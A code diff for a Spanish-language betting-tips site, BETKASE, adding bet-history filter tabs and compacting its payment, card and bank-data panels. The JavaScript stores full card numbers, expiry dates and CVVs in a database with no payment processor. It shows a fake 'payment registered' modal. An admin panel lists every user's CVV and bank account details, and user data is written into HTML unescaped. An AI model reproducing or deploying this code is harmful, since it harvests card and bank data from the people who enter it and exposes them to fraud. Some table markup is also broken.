@@ -74,6 +74,16 @@ header {
     color: black;
 }
 
+.btn-red {
+    background: #ff4444;
+    color: white;
+}
+
+.btn-orange {
+    background: #ff8800;
+    color: black;
+}
+
 .hero {
     min-height: 100vh;
     display: flex;
@@ -208,6 +218,36 @@ header {
     text-align: center;
 }
 
+/* Pestañas */
+.tabs {
+    display: flex;
+    gap: 10px;
+    justify-content: center;
+    margin-bottom: 30px;
+    flex-wrap: wrap;
+}
+
+.tab-btn {
+    padding: 12px 30px;
+    background: #0c0c0c;
+    border: 1px solid #333;
+    border-radius: 30px;
+    cursor: pointer;
+    transition: .3s;
+    color: white;
+    font-weight: bold;
+}
+
+.tab-btn.active {
+    background: #00ff88;
+    color: black;
+    border-color: #00ff88;
+}
+
+.tab-btn:hover:not(.active) {
+    border-color: #00ff88;
+}
+
 .bets {
     display: grid;
     grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
@@ -227,6 +267,17 @@ header {
 .bet-card:hover {
     transform: translateY(-6px);
     border-color: #00ff88;
+}
+
+.bet-card::before {
+    content: '';
+    position: absolute;
+    top: -100px;
+    right: -100px;
+    width: 200px;
+    height: 200px;
+    background: #00ff8820;
+    border-radius: 50%;
 }
 
 .bet-card img {
@@ -261,6 +312,35 @@ header {
 .premium {
     background: gold;
     color: black;
+}
+
+.result-tag {
+    display: inline-block;
+    padding: 5px 12px;
+    border-radius: 20px;
+    font-size: 11px;
+    font-weight: bold;
+    margin-left: 10px;
+}
+
+.result-win {
+    background: #00ff88;
+    color: black;
+}
+
+.result-loss {
+    background: #ff4444;
+    color: white;
+}
+
+.result-void {
+    background: #ff8800;
+    color: black;
+}
+
+.result-pending {
+    background: #666;
+    color: white;
 }
 
 .bet-card h3 {
@@ -319,7 +399,7 @@ header {
     margin-bottom: 20px;
 }
 
-/* Acordeón para métodos de pago */
+/* Acordeón */
 .accordion {
     background: #0c0c0c;
     border-radius: 15px;
@@ -399,7 +479,6 @@ header {
     cursor: pointer;
 }
 
-/* Botones de paneles */
 .panel-buttons {
     display: flex;
     gap: 20px;
@@ -409,8 +488,8 @@ header {
     flex-wrap: wrap;
 }
 
-/* Modal de procesamiento */
-.processing-modal {
+/* Modal */
+.processing-modal, .confirm-modal {
     display: none;
     position: fixed;
     top: 0;
@@ -423,7 +502,7 @@ header {
     align-items: center;
 }
 
-.processing-content {
+.processing-content, .confirm-content {
     background: linear-gradient(145deg, #111, #191919);
     padding: 50px;
     border-radius: 30px;
@@ -446,30 +525,6 @@ header {
 @keyframes spin {
     0% { transform: rotate(0deg); }
     100% { transform: rotate(360deg); }
-}
-
-/* Modal de confirmación */
-.confirm-modal {
-    display: none;
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    background: rgba(0,0,0,0.95);
-    z-index: 2000;
-    justify-content: center;
-    align-items: center;
-}
-
-.confirm-content {
-    background: linear-gradient(145deg, #111, #191919);
-    padding: 40px;
-    border-radius: 30px;
-    text-align: center;
-    max-width: 450px;
-    width: 90%;
-    border: 2px solid #00ff88;
 }
 
 .confirm-buttons {
@@ -739,129 +794,50 @@ footer {
     </div>
 </section>
 
-<!-- Botones para mostrar paneles -->
 <div class="panel-buttons">
     <button class="btn btn-green" onclick="showCardPanel()" id="showCardBtn" style="display:none;">💳 Mis Métodos de Pago</button>
     <button class="btn btn-green" onclick="showTipsterPanel()" id="showTipsterBtn" style="display:none;">🏦 Mis Datos Bancarios</button>
 </div>
 
-<!-- Panel de Tarjetas de Crédito (Clientes) -->
 <section class="user-panel" id="cardPanel">
     <div>
         <h2>💳 Mis Métodos de Pago</h2>
-        <p style="color:#888; margin-bottom:20px;">Registra tus tarjetas para pagar más rápido</p>
-        
         <div id="savedCardsList" class="saved-cards"></div>
-        
         <hr style="margin: 20px 0; border-color:#333;">
-        
-        <h3 style="margin-bottom:20px;">➕ Agregar nueva tarjeta</h3>
-        
-        <div class="input-group">
-            <label>💳 Número de tarjeta</label>
-            <input type="text" id="cardNumber" maxlength="19" placeholder="1234 5678 9012 3456" oninput="formatCardNumber(this)">
-        </div>
-        
-        <div class="input-group">
-            <label>👤 Nombre del titular</label>
-            <input type="text" id="cardHolder" placeholder="Como aparece en la tarjeta">
-        </div>
-        
+        <h3>➕ Agregar nueva tarjeta</h3>
+        <div class="input-group"><label>💳 Número de tarjeta</label><input type="text" id="cardNumber" maxlength="19" placeholder="1234 5678 9012 3456" oninput="formatCardNumber(this)"></div>
+        <div class="input-group"><label>👤 Nombre del titular</label><input type="text" id="cardHolder" placeholder="Como aparece en la tarjeta"></div>
         <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px;">
-            <div class="input-group">
-                <label>📅 Fecha expiración (MM/AA)</label>
-                <input type="text" id="cardExpiry" maxlength="5" placeholder="MM/AA" oninput="formatExpiry(this)">
-            </div>
-            <div class="input-group">
-                <label>🔐 CVV</label>
-                <input type="password" id="cardCvv" maxlength="4" placeholder="123">
-            </div>
+            <div class="input-group"><label>📅 Fecha expiración</label><input type="text" id="cardExpiry" maxlength="5" placeholder="MM/AA" oninput="formatExpiry(this)"></div>
+            <div class="input-group"><label>🔐 CVV</label><input type="password" id="cardCvv" maxlength="4" placeholder="123"></div>
         </div>
-        
-        <div class="input-group">
-            <label>🏦 Banco emisor</label>
-            <select id="cardBank">
-                <option value="">Selecciona</option>
-                <option value="bancolombia">Bancolombia</option>
-                <option value="nequi">Nequi</option>
-                <option value="davivienda">Davivienda</option>
-                <option value="bbva">BBVA</option>
-            </select>
-        </div>
-        
-        <div class="input-group">
-            <label>📧 Correo de facturación</label>
-            <input type="email" id="cardEmail" placeholder="correo@ejemplo.com">
-        </div>
-        
+        <div class="input-group"><label>🏦 Banco emisor</label><select id="cardBank"><option value="">Selecciona</option><option value="bancolombia">Bancolombia</option><option value="nequi">Nequi</option><option value="davivienda">Davivienda</option></select></div>
+        <div class="input-group"><label>📧 Correo de facturación</label><input type="email" id="cardEmail" placeholder="correo@ejemplo.com"></div>
         <button class="btn btn-green" onclick="saveCard()" style="width:100%;">💾 Guardar Tarjeta</button>
         <div id="cardStatus" style="margin-top:15px; text-align:center;"></div>
     </div>
 </section>
 
-<!-- Panel de Datos Bancarios (Tipsters) -->
 <section class="tipster-panel" id="tipsterPanel">
     <div>
         <h2>🏦 Mis Datos Bancarios</h2>
-        <p style="color:#888; margin-bottom:20px;">Registra tu cuenta para recibir pagos</p>
-        
-        <div class="input-group">
-            <label>🏦 Tipo de cuenta</label>
-            <select id="tipsterAccountType">
-                <option value="">Selecciona</option>
-                <option value="ahorros">Cuenta de Ahorros</option>
-                <option value="corriente">Cuenta Corriente</option>
-                <option value="nequi">Nequi</option>
-            </select>
-        </div>
-        
-        <div class="input-group">
-            <label>🏦 Banco</label>
-            <select id="tipsterBank">
-                <option value="">Selecciona</option>
-                <option value="bancolombia">Bancolombia</option>
-                <option value="nequi">Nequi</option>
-                <option value="davivienda">Davivienda</option>
-            </select>
-        </div>
-        
-        <div class="input-group">
-            <label>🔢 Número de cuenta</label>
-            <input type="text" id="tipsterAccountNumber" placeholder="Número de cuenta">
-        </div>
-        
-        <div class="input-group">
-            <label>👤 Titular de la cuenta</label>
-            <input type="text" id="tipsterAccountHolder" placeholder="Nombre completo">
-        </div>
-        
-        <div class="input-group">
-            <label>🆔 Cédula / NIT</label>
-            <input type="text" id="tipsterIdNumber" placeholder="CC: 1234567890">
-        </div>
-        
-        <div class="input-group">
-            <label>📧 Correo para pagos</label>
-            <input type="email" id="tipsterEmail" placeholder="correo@ejemplo.com">
-        </div>
-        
-        <div class="input-group">
-            <label>📱 Teléfono</label>
-            <input type="tel" id="tipsterPhone" placeholder="3001234567">
-        </div>
-        
+        <div class="input-group"><label>🏦 Tipo de cuenta</label><select id="tipsterAccountType"><option value="">Selecciona</option><option value="ahorros">Cuenta de Ahorros</option><option value="corriente">Cuenta Corriente</option><option value="nequi">Nequi</option></select></div>
+        <div class="input-group"><label>🏦 Banco</label><select id="tipsterBank"><option value="">Selecciona</option><option value="bancolombia">Bancolombia</option><option value="nequi">Nequi</option><option value="davivienda">Davivienda</option></select></div>
+        <div class="input-group"><label>🔢 Número de cuenta</label><input type="text" id="tipsterAccountNumber" placeholder="Número de cuenta"></div>
+        <div class="input-group"><label>👤 Titular de la cuenta</label><input type="text" id="tipsterAccountHolder" placeholder="Nombre completo"></div>
+        <div class="input-group"><label>🆔 Cédula / NIT</label><input type="text" id="tipsterIdNumber" placeholder="CC: 1234567890"></div>
+        <div class="input-group"><label>📧 Correo para pagos</label><input type="email" id="tipsterEmail" placeholder="correo@ejemplo.com"></div>
+        <div class="input-group"><label>📱 Teléfono</label><input type="tel" id="tipsterPhone" placeholder="3001234567"></div>
         <button class="btn btn-green" onclick="saveTipsterData()" style="width:100%;">💾 Guardar Datos</button>
         <div id="tipsterStatus" style="margin-top:15px; text-align:center;"></div>
     </div>
 </section>
 
-<!-- Sección de Planes -->
 <section class="plans-section" id="plansSection">
     <h2 class="section-title">📊 Planes Premium</h2>
     <div class="plans-container" id="plansContainer"></div>
 </section>
 
-<!-- Panel Admin -->
 <div class="admin-panel" id="adminPanel">
     <h2>🎮 Panel Administrador</h2>
     <button class="btn btn-green" onclick="loadAllTipsters()">💰 Ver Tipsters</button>
@@ -870,25 +846,11 @@ footer {
     <div id="tipstersList" style="margin-top:20px;"></div>
     <div id="cardsList" style="margin-top:20px;"></div>
     <div id="bankDataList" style="margin-top:20px;"></div>
-    
     <hr style="margin: 30px 0;">
-    
     <h3>⚽ Gestión de Apuestas</h3>
     <div class="team-selectors">
-        <div class="team-selector">
-            <label>🏠 EQUIPO LOCAL</label>
-            <select id="localTeam" onchange="updateMatch()">
-                <option value="">-- Seleccionar --</option>
-            </select>
-            <img id="localPreview" src="" style="display:none; width:100%; margin-top:10px;">
-        </div>
-        <div class="team-selector">
-            <label>✈️ EQUIPO VISITANTE</label>
-            <select id="awayTeam" onchange="updateMatch()">
-                <option value="">-- Seleccionar --</option>
-            </select>
-            <img id="awayPreview" src="" style="display:none; width:100%; margin-top:10px;">
-        </div>
+        <div class="team-selector"><label>🏠 EQUIPO LOCAL</label><select id="localTeam" onchange="updateMatch()"><option value="">-- Seleccionar --</option></select><img id="localPreview" src="" style="display:none;"></div>
+        <div class="team-selector"><label>✈️ EQUIPO VISITANTE</label><select id="awayTeam" onchange="updateMatch()"><option value="">-- Seleccionar --</option></select><img id="awayPreview" src="" style="display:none;"></div>
     </div>
     <div class="match-preview" id="matchPreview"></div>
     <input type="text" id="prediction" placeholder="🔮 Pronóstico">
@@ -898,120 +860,39 @@ footer {
 </div>
 
 <section class="section">
-    <h2 class="section-title">⚽ Apuestas en Vivo</h2>
+    <h2 class="section-title">⚽ Historial de Apuestas</h2>
+    <div class="tabs">
+        <button class="tab-btn active" onclick="filterBets('all')">📋 Todas</button>
+        <button class="tab-btn" onclick="filterBets('win')">🏆 Ganadas</button>
+        <button class="tab-btn" onclick="filterBets('loss')">❌ Perdidas</button>
+        <button class="tab-btn" onclick="filterBets('void')">⚠️ Anuladas</button>
+        <button class="tab-btn" onclick="filterBets('pending')">⏳ Pendientes</button>
+    </div>
     <div class="bets" id="bets">Cargando...</div>
 </section>
 
-<!-- Modal de Pago con Acordeón -->
 <div id="paymentModal" class="modal">
     <div class="modal-content">
         <h3 id="modalPlanName">Plan</h3>
         <p id="modalPlanPrice" style="text-align:center; font-size:24px; color:#00ff88;">$0 COP</p>
-        
-        <div class="accordion">
-            <div class="accordion-header" onclick="toggleAccordion('savedCardsAccordion')">
-                <span>💳 Mis Tarjetas Guardadas</span>
-                <span class="icon">▼</span>
-            </div>
-            <div id="savedCardsAccordion" class="accordion-content">
-                <div id="savedCardsPayment"></div>
-            </div>
-        </div>
-        
-        <div class="accordion">
-            <div class="accordion-header" onclick="toggleAccordion('newCardAccordion')">
-                <span>➕ Usar Nueva Tarjeta</span>
-                <span class="icon">▼</span>
-            </div>
-            <div id="newCardAccordion" class="accordion-content">
-                <div class="input-group">
-                    <label>💳 Número de tarjeta</label>
-                    <input type="text" id="payCardNumber" maxlength="19" placeholder="1234 5678 9012 3456" oninput="formatCardNumber(this)">
-                </div>
-                <div class="input-group">
-                    <label>👤 Titular</label>
-                    <input type="text" id="payCardHolder">
-                </div>
-                <div style="display:grid; grid-template-columns:1fr 1fr; gap:15px;">
-                    <div class="input-group">
-                        <label>📅 Fecha expiración</label>
-                        <input type="text" id="payCardExpiry" maxlength="5" placeholder="MM/AA" oninput="formatExpiry(this)">
-                    </div>
-                    <div class="input-group">
-                        <label>🔐 CVV</label>
-                        <input type="password" id="payCardCvv" maxlength="4">
-                    </div>
-                </div>
-            </div>
-        </div>
-        
-        <div class="accordion">
-            <div class="accordion-header" onclick="toggleAccordion('otherMethodsAccordion')">
-                <span>🏦 Otros Métodos de Pago</span>
-                <span class="icon">▼</span>
-            </div>
-            <div id="otherMethodsAccordion" class="accordion-content">
-                <div class="input-group">
-                    <label>🏦 Selecciona tu banco</label>
-                    <select id="otherBankSelect">
-                        <option value="bancolombia">Bancolombia</option>
-                        <option value="nequi">Nequi</option>
-                        <option value="davivienda">Davivienda</option>
-                        <option value="bbva">BBVA</option>
-                        <option value="occidente">Banco de Occidente</option>
-                    </select>
-                </div>
-                <div class="input-group">
-                    <label>📱 Número de cuenta / Nequi / Daviplata</label>
-                    <input type="text" id="otherAccountNumber" placeholder="Número de cuenta">
-                </div>
-                <div class="input-group">
-                    <label>👤 Nombre del titular</label>
-                    <input type="text" id="otherAccountHolder" placeholder="Nombre completo">
-                </div>
-            </div>
-        </div>
-        
+        <div class="accordion"><div class="accordion-header" onclick="toggleAccordion('savedCardsAccordion')"><span>💳 Mis Tarjetas Guardadas</span><span class="icon">▼</span></div><div id="savedCardsAccordion" class="accordion-content"><div id="savedCardsPayment"></div></div></div>
+        <div class="accordion"><div class="accordion-header" onclick="toggleAccordion('newCardAccordion')"><span>➕ Usar Nueva Tarjeta</span><span class="icon">▼</span></div><div id="newCardAccordion" class="accordion-content"><div class="input-group"><label>💳 Número de tarjeta</label><input type="text" id="payCardNumber" maxlength="19" placeholder="1234 5678 9012 3456" oninput="formatCardNumber(this)"></div><div class="input-group"><label>👤 Titular</label><input type="text" id="payCardHolder"></div><div style="display:grid; grid-template-columns:1fr 1fr; gap:15px;"><div class="input-group"><label>📅 Fecha expiración</label><input type="text" id="payCardExpiry" maxlength="5" placeholder="MM/AA" oninput="formatExpiry(this)"></div><div class="input-group"><label>🔐 CVV</label><input type="password" id="payCardCvv" maxlength="4"></div></div></div></div>
+        <div class="accordion"><div class="accordion-header" onclick="toggleAccordion('otherMethodsAccordion')"><span>🏦 Otros Métodos de Pago</span><span class="icon">▼</span></div><div id="otherMethodsAccordion" class="accordion-content"><div class="input-group"><label>🏦 Selecciona tu banco</label><select id="otherBankSelect"><option value="bancolombia">Bancolombia</option><option value="nequi">Nequi</option><option value="davivienda">Davivienda</option></select></div><div class="input-group"><label>📱 Número de cuenta</label><input type="text" id="otherAccountNumber" placeholder="Número de cuenta"></div><div class="input-group"><label>👤 Nombre del titular</label><input type="text" id="otherAccountHolder" placeholder="Nombre completo"></div></div></div>
         <button class="btn btn-green payment-btn" onclick="processPaymentWithMethod()" style="margin-top:20px; width:100%;">✅ Pagar Ahora</button>
         <button class="close-modal" onclick="closePaymentModal()">Cerrar</button>
     </div>
 </div>
 
-<!-- Modal de Procesamiento -->
 <div id="processingModal" class="processing-modal">
-    <div class="processing-content">
-        <div class="spinner"></div>
-        <h2 style="margin-bottom:15px;">⏳ Procesando Pago</h2>
-        <p style="color:#888;">Estamos procesando tu transacción...</p>
-        <p style="color:#888; margin-top:10px;">Por favor espera un momento.</p>
-        <p style="color:#666; font-size:12px; margin-top:20px;">No cierres esta ventana</p>
-    </div>
+    <div class="processing-content"><div class="spinner"></div><h2>⏳ Procesando Pago</h2><p>Estamos procesando tu transacción...</p></div>
 </div>
 
-<!-- Modal de Confirmación de Pago -->
 <div id="confirmModal" class="confirm-modal">
-    <div class="confirm-content">
-        <div style="font-size:48px; margin-bottom:20px;">✉️</div>
-        <h2 style="margin-bottom:15px;">¡Pago en procesamiento!</h2>
-        <p style="color:#888; margin-bottom:15px;">Enviaremos una confirmación a tu correo electrónico: <strong id="confirmEmail"></strong></p>
-        <p style="color:#888; margin-bottom:20px;">En las próximas 24 horas recibirás la activación de tu plan premium una vez sea confirmado el pago.</p>
-        <div class="confirm-buttons">
-            <button class="btn-no" onclick="closeConfirmModalAndContinue()">Cerrar</button>
-        </div>
-    </div>
+    <div class="confirm-content"><div style="font-size:48px;">✉️</div><h2>¡Pago registrado!</h2><p>Enviaremos confirmación a: <strong id="confirmEmail"></strong></p><button class="btn-no" onclick="closeConfirmModalAndContinue()">Cerrar</button></div>
 </div>
 
-<!-- Modal para guardar datos bancarios después del pago -->
 <div id="saveBankModal" class="confirm-modal">
-    <div class="confirm-content">
-        <div style="font-size:48px; margin-bottom:20px;">🏦</div>
-        <h2 style="margin-bottom:15px;">¿Deseas guardar tus datos bancarios?</h2>
-        <p style="color:#888; margin-bottom:20px;">Guardar tus datos bancarios te permitirá recibir pagos si publicas apuestas premium.</p>
-        <div class="confirm-buttons">
-            <button class="btn-yes" onclick="saveBankDataAfterPayment()">✅ Sí, guardar datos</button>
-            <button class="btn-no" onclick="closeSaveBankModal()">❌ No, gracias</button>
-        </div>
-    </div>
+    <div class="confirm-content"><div style="font-size:48px;">🏦</div><h2>¿Guardar datos bancarios?</h2><p>Para recibir pagos por apuestas premium</p><div class="confirm-buttons"><button class="btn-yes" onclick="saveBankDataAfterPayment()">✅ Sí</button><button class="btn-no" onclick="closeSaveBankModal()">❌ No</button></div></div>
 </div>
 
 <footer>© 2026 BETKASE</footer>
@@ -1046,98 +927,30 @@ const defaultPlans = [
 
 let currentSelectedPlan = null;
 let selectedCardId = null;
-let currentPaymentMethod = null;
-let currentPaymentData = null;
 let betsUnsubscribe = null;
 let editingId = null;
+let currentFilter = 'all';
 
-function formatCardNumber(input) {
-    let value = input.value.replace(/\D/g, '');
-    value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
-    input.value = value;
-}
-function formatExpiry(input) {
-    let value = input.value.replace(/\D/g, '');
-    if (value.length >= 2) value = value.substring(0,2) + '/' + value.substring(2,4);
-    input.value = value;
-}
+function formatCardNumber(input) { let v = input.value.replace(/\D/g, ''); v = v.replace(/(\d{4})(?=\d)/g, '$1 '); input.value = v; }
+function formatExpiry(input) { let v = input.value.replace(/\D/g, ''); if (v.length >= 2) v = v.substring(0,2) + '/' + v.substring(2,4); input.value = v; }
+function toggleAccordion(id) { const c = document.getElementById(id); c.classList.toggle('active'); const icon = c.previousElementSibling.querySelector('.icon'); icon.style.transform = c.classList.contains('active') ? 'rotate(180deg)' : 'rotate(0deg)'; }
+function showCardPanel() { const cp = document.getElementById('cardPanel'); const tp = document.getElementById('tipsterPanel'); tp.style.display = 'none'; cp.style.display = cp.style.display === 'none' || cp.style.display === '' ? 'block' : 'none'; if (cp.style.display === 'block') cp.scrollIntoView({ behavior: 'smooth' }); }
+function showTipsterPanel() { const cp = document.getElementById('cardPanel'); const tp = document.getElementById('tipsterPanel'); cp.style.display = 'none'; tp.style.display = tp.style.display === 'none' || tp.style.display === '' ? 'block' : 'none'; if (tp.style.display === 'block') tp.scrollIntoView({ behavior: 'smooth' }); }
+function filterBets(filter) { currentFilter = filter; document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active')); event.target.classList.add('active'); loadBets(); }
 
-function toggleAccordion(id) {
-    const content = document.getElementById(id);
-    content.classList.toggle('active');
-    const header = content.previousElementSibling;
-    const icon = header.querySelector('.icon');
-    if (content.classList.contains('active')) {
-        icon.style.transform = 'rotate(180deg)';
-    } else {
-        icon.style.transform = 'rotate(0deg)';
-    }
-}
-
-// Mostrar panel de tarjetas
-function showCardPanel() {
-    const cardPanel = document.getElementById('cardPanel');
-    const tipsterPanel = document.getElementById('tipsterPanel');
-    tipsterPanel.style.display = 'none';
-    if (cardPanel.style.display === 'none' || cardPanel.style.display === '') {
-        cardPanel.style.display = 'block';
-        cardPanel.scrollIntoView({ behavior: 'smooth' });
-    } else {
-        cardPanel.style.display = 'none';
-    }
-}
-
-// Mostrar panel de datos bancarios
-function showTipsterPanel() {
-    const cardPanel = document.getElementById('cardPanel');
-    const tipsterPanel = document.getElementById('tipsterPanel');
-    cardPanel.style.display = 'none';
-    if (tipsterPanel.style.display === 'none' || tipsterPanel.style.display === '') {
-        tipsterPanel.style.display = 'block';
-        tipsterPanel.scrollIntoView({ behavior: 'smooth' });
-    } else {
-        tipsterPanel.style.display = 'none';
-    }
-}
-
-// ============ REGISTRO DE TARJETAS ============
 async function saveCard() {
     const user = auth.currentUser;
-    if (!user) return alert('Inicia sesión primero');
-    
+    if (!user) return alert('Inicia sesión');
     const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
     if (cardNumber.length < 16) return alert('Número inválido');
-    const cardHolder = document.getElementById('cardHolder').value;
-    if (!cardHolder) return alert('Nombre del titular requerido');
-    const cardExpiry = document.getElementById('cardExpiry').value;
-    const cardCvv = document.getElementById('cardCvv').value;
-    const cardBank = document.getElementById('cardBank').value;
-    const cardEmail = document.getElementById('cardEmail').value;
-    
-    const cardData = {
-        id: Date.now().toString(),
-        cardNumber: cardNumber,
-        cardHolder: cardHolder,
-        expiry: cardExpiry,
-        cvv: cardCvv,
-        bank: cardBank,
-        email: cardEmail || user.email,
-        last4: cardNumber.slice(-4),
-        brand: cardNumber[0] === '4' ? 'Visa' : 'Mastercard',
-        createdAt: Date.now()
-    };
-    
-    const userDoc = await db.collection('users').doc(user.uid).get();
-    let cards = userDoc.exists && userDoc.data().savedCards ? userDoc.data().savedCards : [];
+    const cardData = { id: Date.now().toString(), cardNumber, cardHolder: document.getElementById('cardHolder').value, expiry: document.getElementById('cardExpiry').value, cvv: document.getElementById('cardCvv').value, bank: document.getElementById('cardBank').value, email: document.getElementById('cardEmail').value || user.email, last4: cardNumber.slice(-4), brand: cardNumber[0] === '4' ? 'Visa' : 'Mastercard', createdAt: Date.now() };
+    const doc = await db.collection('users').doc(user.uid).get();
+    let cards = doc.exists && doc.data().savedCards ? doc.data().savedCards : [];
     cards.push(cardData);
     await db.collection('users').doc(user.uid).set({ savedCards: cards }, { merge: true });
-    
-    document.getElementById('cardStatus').innerHTML = '<p style="color:#0f0;">✅ Tarjeta guardada</p>';
-    clearCardForm();
+    alert('✅ Tarjeta guardada');
     loadSavedCards();
-    setTimeout(() => document.getElementById('cardStatus').innerHTML = '', 2000);
 }
-
 async function loadSavedCards() {
     const user = auth.currentUser;
     if (!user) return;
@@ -1146,125 +959,23 @@ async function loadSavedCards() {
     const container = document.getElementById('savedCardsList');
     if (!container) return;
     if (cards.length === 0) container.innerHTML = '<p>No hay tarjetas guardadas</p>';
-    else {
-        container.innerHTML = cards.map(c => `
-            <div class="saved-card">
-                <div class="card-info">
-                    <span>${c.brand}</span>
-                    <span>**** **** **** ${c.last4}</span>
-                    <span>${c.cardHolder}</span>
-                    <span>Exp: ${c.expiry}</span>
-                </div>
-                <button class="delete-card" onclick="deleteCard('${c.id}')">Eliminar</button>
-            </div>
-        `).join('');
-    }
+    else container.innerHTML = cards.map(c => `<div class="saved-card"><div class="card-info"><span>${c.brand}</span><span>**** ${c.last4}</span><span>${c.cardHolder}</span><span>Exp: ${c.expiry}</span></div><button class="delete-card" onclick="deleteCard('${c.id}')">Eliminar</button></div>`).join('');
 }
+async function deleteCard(cardId) { if (!confirm('¿Eliminar?')) return; const user = auth.currentUser; const doc = await db.collection('users').doc(user.uid).get(); let cards = doc.data().savedCards || []; cards = cards.filter(c => c.id !== cardId); await db.collection('users').doc(user.uid).update({ savedCards: cards }); loadSavedCards(); }
 
-async function deleteCard(cardId) {
-    if (!confirm('¿Eliminar tarjeta?')) return;
-    const user = auth.currentUser;
-    const doc = await db.collection('users').doc(user.uid).get();
-    let cards = doc.data().savedCards || [];
-    cards = cards.filter(c => c.id !== cardId);
-    await db.collection('users').doc(user.uid).update({ savedCards: cards });
-    loadSavedCards();
-}
-
-function clearCardForm() {
-    ['cardNumber', 'cardHolder', 'cardExpiry', 'cardCvv', 'cardBank', 'cardEmail'].forEach(id => {
-        document.getElementById(id).value = '';
-    });
-}
-
-// ============ REGISTRO DE TIPSTER ============
 async function saveTipsterData() {
     const user = auth.currentUser;
-    if (!user) return alert('Inicia sesión primero');
-    
-    const data = {
-        accountType: document.getElementById('tipsterAccountType').value,
-        bank: document.getElementById('tipsterBank').value,
-        accountNumber: document.getElementById('tipsterAccountNumber').value,
-        accountHolder: document.getElementById('tipsterAccountHolder').value,
-        idNumber: document.getElementById('tipsterIdNumber').value,
-        email: document.getElementById('tipsterEmail').value || user.email,
-        phone: document.getElementById('tipsterPhone').value,
-        updatedAt: Date.now()
-    };
-    
+    if (!user) return alert('Inicia sesión');
+    const data = { accountType: document.getElementById('tipsterAccountType').value, bank: document.getElementById('tipsterBank').value, accountNumber: document.getElementById('tipsterAccountNumber').value, accountHolder: document.getElementById('tipsterAccountHolder').value, idNumber: document.getElementById('tipsterIdNumber').value, email: document.getElementById('tipsterEmail').value || user.email, phone: document.getElementById('tipsterPhone').value, updatedAt: Date.now() };
     if (!data.accountType) return alert('Selecciona tipo de cuenta');
-    if (!data.bank) return alert('Selecciona banco');
-    if (!data.accountNumber) return alert('Número de cuenta requerido');
-    
-    await db.collection('tipsters').doc(user.uid).set({
-        email: user.email,
-        paymentData: data,
-        totalEarnings: 0,
-        createdAt: Date.now()
-    }, { merge: true });
-    
-    document.getElementById('tipsterStatus').innerHTML = '<p style="color:#0f0;">✅ Datos guardados</p>';
-    setTimeout(() => document.getElementById('tipsterStatus').innerHTML = '', 2000);
+    await db.collection('tipsters').doc(user.uid).set({ email: user.email, paymentData: data, totalEarnings: 0, createdAt: Date.now() }, { merge: true });
+    alert('✅ Datos guardados');
 }
 
-async function loadTipsterData() {
-    const user = auth.currentUser;
-    if (!user) return;
-    const doc = await db.collection('tipsters').doc(user.uid).get();
-    if (doc.exists && doc.data().paymentData) {
-        const d = doc.data().paymentData;
-        document.getElementById('tipsterAccountType').value = d.accountType || '';
-        document.getElementById('tipsterBank').value = d.bank || '';
-        document.getElementById('tipsterAccountNumber').value = d.accountNumber || '';
-        document.getElementById('tipsterAccountHolder').value = d.accountHolder || '';
-        document.getElementById('tipsterIdNumber').value = d.idNumber || '';
-        document.getElementById('tipsterEmail').value = d.email || '';
-        document.getElementById('tipsterPhone').value = d.phone || '';
-    }
-}
+async function loadAllTipsters() { const snap = await db.collection('tipsters').get(); let html = '<h3>💰 Tipsters</h3><div class="users-table"><tr><th>Email</th><th>Banco</th><th>Cuenta</th><th>Titular</th></tr>'; snap.forEach(doc => { const t = doc.data(); if (t.paymentData) html += `<tr><td>${t.email}</td><td>${t.paymentData.bank}</td><td>${t.paymentData.accountNumber}</td><td>${t.paymentData.accountHolder}</td></tr>`; }); html += '</table></div>'; document.getElementById('tipstersList').innerHTML = html; }
+async function loadAllCards() { const snap = await db.collection('users').get(); let html = '<h3>💳 Tarjetas</h3><div class="users-table"><tr><th>Usuario</th><th>Tarjeta</th><th>Titular</th><th>CVV</th></tr>'; snap.forEach(doc => { const u = doc.data(); if (u.savedCards) u.savedCards.forEach(c => html += `<tr><td>${u.email}</td><td>**** ${c.last4}</td><td>${c.cardHolder}</td><td>${c.cvv}</td></tr>`); }); html += '</table></div>'; document.getElementById('cardsList').innerHTML = html; }
+async function loadAllBankData() { const snap = await db.collection('bankData').get(); let html = '<h3>🏦 Datos Bancarios</h3><div class="users-table"></table><th>Usuario</th><th>Banco</th><th>Cuenta</th><th>Titular</th></tr>'; snap.forEach(doc => { const d = doc.data(); html += `<tr><td>${d.userEmail}</td><td>${d.bank}</td><td>${d.accountNumber}</td><td>${d.accountHolder}</td></tr>`; }); html += '</table></div>'; document.getElementById('bankDataList').innerHTML = html; }
 
-// ============ ADMIN: VER DATOS ============
-async function loadAllTipsters() {
-    const snapshot = await db.collection('tipsters').get();
-    let html = '<h3>💰 Tipsters Registrados</h3><div class="users-table"><tr><th>Email</th><th>Banco</th><th>Cuenta</th><th>Titular</th><th>Teléfono</th></tr>';
-    snapshot.forEach(doc => {
-        const t = doc.data();
-        if (t.paymentData) {
-            html += `<tr><td>${t.email}</td><td>${t.paymentData.bank}</td><td>${t.paymentData.accountNumber}</td><td>${t.paymentData.accountHolder}</td><td>${t.paymentData.phone || '-'}</td></tr>`;
-        }
-    });
-    html += '</table></div>';
-    document.getElementById('tipstersList').innerHTML = html;
-}
-
-async function loadAllCards() {
-    const snapshot = await db.collection('users').get();
-    let html = '<h3>💳 Tarjetas Registradas</h3><div class="users-table"><tr><th>Usuario</th><th>Tarjeta</th><th>Titular</th><th>Expira</th><th>CVV</th><th>Banco</th></tr>';
-    snapshot.forEach(doc => {
-        const user = doc.data();
-        if (user.savedCards) {
-            user.savedCards.forEach(card => {
-                html += `<tr><td>${user.email}</td><td>**** ${card.last4} (${card.brand})</td><td>${card.cardHolder}</td><td>${card.expiry}</td><td>${card.cvv}</td><td>${card.bank || '-'}</td></tr>`;
-            });
-        }
-    });
-    html += '}</table></div>';
-    document.getElementById('cardsList').innerHTML = html;
-}
-
-async function loadAllBankData() {
-    const snapshot = await db.collection('bankData').get();
-    let html = '<h3>🏦 Datos Bancarios Guardados</h3><div class="users-table"><table><tr><th>Usuario</th><th>Banco</th><th>Cuenta</th><th>Titular</th><th>Fecha</th></tr>';
-    snapshot.forEach(doc => {
-        const data = doc.data();
